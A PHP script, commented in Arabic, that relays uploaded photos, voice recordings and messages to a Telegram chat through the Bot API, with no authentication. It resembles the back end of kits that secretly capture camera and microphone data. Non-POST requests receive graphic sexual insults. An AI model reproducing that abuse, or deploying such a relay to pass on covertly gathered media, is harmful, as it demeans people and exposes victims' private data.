<?php
$token = "{{TOKEN}}"; // ← ضع التوكن فقط هنا

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("كس امك يا ابن القحبه 
    كس اختك شلع قلع يا ابن المفلوخه المشلوحه نيك امك واختك يالمفتوح جعلني اركب الكس حق خواتك مجرد تفكيرك الدخول هنا 
    جعلني اعرب امك ");
}

$chat_id = $_POST['chat_id'] ?? null;
if (!$chat_id) {
    http_response_code(400);
    exit("❌ chat_id مفقود");
}

$responses = []; // لتخزين ردود التليجرام

// ⬛ 1. إرسال صورة (إن وجدت)
if (isset($_FILES['photo'])) {
    $photo = new CURLFile($_FILES['photo']['tmp_name'], mime_content_type($_FILES['photo']['tmp_name']), $_FILES['photo']['name']);
    
    $data = [
        'chat_id' => $chat_id,
        'photo' => $photo,
    ];

    if (!empty($_POST['message'])) {
        $data['caption'] = $_POST['message'];
    }

    $ch = curl_init("https://api.telegram.org/bot$token/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
    ]);
    $responses[] = curl_exec($ch);
    curl_close($ch);

    // بعد إرسال الصورة مع التعليق، نحذف الرسالة حتى لا تتكرر
    unset($_POST['message']);
}

// ⬛ 2. إرسال تسجيل صوتي (إن وجد)
if (isset($_FILES['voice'])) {
    $voice = new CURLFile($_FILES['voice']['tmp_name'], 'audio/ogg', $_FILES['voice']['name']);

    $data = [
        'chat_id' => $chat_id,
        'voice' => $voice,
    ];

    if (!empty($_POST['message'])) {
        $data['caption'] = $_POST['message'];
    }

    $ch = curl_init("https://api.telegram.org/bot$token/sendVoice");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
    ]);
    $responses[] = curl_exec($ch);
    curl_close($ch);

    unset($_POST['message']);
}

// ⬛ 3. إرسال رسالة نصية (إذا لم تُرسل كـ caption)
if (!empty($_POST['message'])) {
    $data = [
        'chat_id' => $chat_id,
        'text' => $_POST['message'],
    ];

    $ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
    ]);
    $responses[] = curl_exec($ch);
    curl_close($ch);
}

// ✅ طباعة الرد (اختياري)
foreach ($responses as $r) {
    echo $r . "\n";
}
